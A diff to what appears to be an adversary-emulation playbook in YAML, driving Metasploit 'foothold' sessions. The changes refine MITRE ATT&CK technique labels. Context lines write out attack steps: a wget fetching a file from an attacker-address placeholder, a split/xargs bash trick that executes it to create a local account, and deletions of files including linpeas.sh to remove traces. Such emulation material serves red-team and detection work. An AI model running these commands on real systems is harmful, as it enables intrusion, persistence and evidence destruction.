@@ -64,7 +64,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     session: "foothold"
@@ -72,7 +72,7 @@ commands:
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
-      technique_name:"Ingress Tool Transfer"
+      technique_name: "Ingress Tool Transfer"
 
   - type: msf-session
     cmd: shell
@@ -177,24 +177,27 @@ commands:
     cmd: "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
     end_str: "PWN >"
     metadata:
-      techniques: "T1105,T1136"
+      techniques: "T1105,T1136.001"
       tactics: "Command and Control,Persistence"
+      technique_name: "Ingress Tool Transfer,Create Account: Local Account"
 
   - type: msf-session
     cmd: split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1218,T1136"
+      techniques: "T1218,T1136.001"
       tactics: "Defense Evasion,Persistence"
+      technique_name: "System Binary Proxy Execution,Create Account: Local Account"
 
   - type: msf-session
     cmd: rm /opt/README.txt
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1070"
+      techniques: "T1070.004"
       tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
   - type: msf-session
     cmd: exit
@@ -206,16 +209,18 @@ commands:
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1070"
+      techniques: "T1070.004"
       tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
   - type: msf-session
     cmd: rm linpeas.sh
     session: "foothold"
     end_str: "PWN >"
     metadata:
-      techniques: "T1070"
+      techniques: "T1070.004"
       tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: File Deletion"
 
   - type: msf-session
     cmd: exit
